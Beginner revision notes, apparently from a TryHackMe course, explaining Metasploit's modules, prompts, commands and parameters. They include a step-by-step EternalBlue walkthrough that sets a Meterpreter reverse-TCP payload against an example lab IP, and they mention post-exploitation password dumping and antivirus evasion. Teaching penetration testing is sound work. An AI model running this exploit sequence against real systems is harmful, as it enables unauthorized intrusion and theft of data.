# Metasploit Framework: The Absolute Beginner's Guide

> TryHackMe — Quick Revision Notes

---

# 1. What is Metasploit?

Think of **Metasploit** as a giant **Swiss Army Knife for penetration testing**.

It helps security professionals:

- Find vulnerabilities
- Test vulnerabilities
- Exploit vulnerabilities
- Gain access to systems (in authorized environments)
- Manage sessions after access

### Simple Analogy

```text
Nmap = Finds doors

Metasploit = Tries the keys and tools on those doors
```

---

# 2. The 7 Modules (The Toolbox)

Metasploit is organized into folders called **modules**.

---

## exploits/ (The Weapon)

Contains code that abuses a specific vulnerability.

### Analogy

```text
Exploit = The key that fits a vulnerable lock
```

Example:

```text
Windows SMB vulnerability exploit
```

---

## payloads/ (What Gets Delivered)

The payload is what runs on the target after exploitation.

### Analogy

```text
Exploit = Delivery truck

Payload = Package inside truck
```

---

### Singles

Self-contained payload.

Everything is included in one package.

### Analogy

```text
Download one complete file
```

---

### Stagers

Tiny payload used only to establish a connection.

### Analogy

```text
A scout sent ahead first
```

Purpose:

```text
Create connection
Prepare target
```

---

### Stages

Large payload downloaded after the stager connects.

### Analogy

```text
The main army arrives after the scout succeeds
```

Examples:

- Meterpreter
- Command shell

---

### Adapters

Convert payloads into different formats.

### Analogy

```text
Power adapter for different wall sockets
```

Examples:

- PowerShell payload
- Executable payload
- Script payload

---

## auxiliary/ (The Utility Toolbox)

Modules that do not exploit.

Used for:

- Scanning
- Enumeration
- Information gathering
- Brute forcing

### Analogy

```text
Investigation tools
```

---

## post/ (After You Get Inside)

Modules used after access is gained.

Examples:

- Dump passwords
- Enumerate users
- Gather files

### Analogy

```text
What you do after entering the building
```

---

## encoders/

Used to modify payloads.

Purpose:

```text
Avoid simple detection
```

---

## evasion/

Used to help bypass security products.

Examples:

- Antivirus
- Security monitoring tools

---

## nops/

NOP = No Operation

Used to improve exploit reliability.

### Analogy

```text
Padding around a package so it arrives safely
```

---

# 3. Decoding the Command Prompts

---

## Main Menu

```text
msf6 >
```

Meaning:

```text
Metasploit is open
No module selected yet
```

---

## Inside a Module

```text
msf6 exploit(windows/smb/example) >
```

Meaning:

```text
Specific exploit selected
Ready for configuration
```

---

## Meterpreter Session

```text
meterpreter >
```

Meaning:

```text
You have access to the target machine
```

Think:

```text
You are inside the victim system
```

---

# 4. The Command Cheat Sheet

---

## search

Find modules.

```bash
search smb
```

---

## use

Select a module.

```bash
use exploit/windows/smb/example
```

---

## back

Leave current module.

```bash
back
```

---

## show options

Display required settings.

```bash
show options
```

---

## set

Set a value.

```bash
set RHOSTS 10.10.10.5
```

---

## unset

Remove a value.

```bash
unset RHOSTS
```

---

## setg

Set globally.

```bash
setg LHOST 10.10.10.20
```

Used across all modules.

---

## unsetg

Remove global value.

```bash
unsetg LHOST
```

---

## unset all

Clear all local settings.

```bash
unset all
```

---

## check

Check if target appears vulnerable.

```bash
check
```

---

## exploit

Launch exploit.

```bash
exploit
```

---

## run

Often identical to exploit.

```bash
run
```

---

## exploit -z

Run exploit in background.

```bash
exploit -z
```

Allows continued use of console.

---

# 5. The Core Parameters (The Variables)

| Parameter | Meaning |
|------------|----------|
| `RHOSTS` | Remote target IP address |
| `RPORT` | Remote target port |
| `LHOST` | Your attacking machine IP |
| `LPORT` | Port waiting for callback |
| `PAYLOAD` | Code delivered to target |
| `SESSION` | Active connection to compromised machine |

---

## Easy Memory Trick

```text
R = Remote (Victim)

L = Local (You)
```

---

# 6. Real-Life Walkthrough (Putting It All Together)

---

## Step 1 — Start Metasploit

```bash
msfconsole
```

---

## Step 2 — Search For Vulnerability

```bash
search eternalblue
```

Output:

```text
Exploit module found
```

---

## Step 3 — Select Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Prompt changes:

```text
msf6 exploit(...) >
```

---

## Step 4 — Check Requirements

```bash
show options
```

Look for:

```text
RHOSTS
RPORT
LHOST
PAYLOAD
```

---

## Step 5 — Configure Target

```bash
set RHOSTS 10.10.10.5

set LHOST 10.10.10.20

set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

Verify:

```bash
show options
```

---

## Step 6 — Launch Exploit

```bash
exploit
```

If successful:

```text
Meterpreter session opened
```

Prompt changes:

```text
meterpreter >
```

You now have an active session.

---

# 7. MOST IMPORTANT THINGS TO REMEMBER

```text
Metasploit = Exploitation Framework

exploit = Vulnerability trigger

payload = Code delivered after exploitation

auxiliary = Scanners & tools

post = Actions after access

meterpreter = Advanced interactive shell

RHOSTS = Victim IP

LHOST = Your IP

show options = Check required values

search → use → set → exploit
```

---

# 8. 30 Second Revision

```text
1. Open Metasploit
   msfconsole

2. Search
   search smb

3. Select
   use exploit/...

4. Configure
   set RHOSTS ...
   set LHOST ...

5. Verify
   show options

6. Launch
   exploit

7. Success
   meterpreter >
```
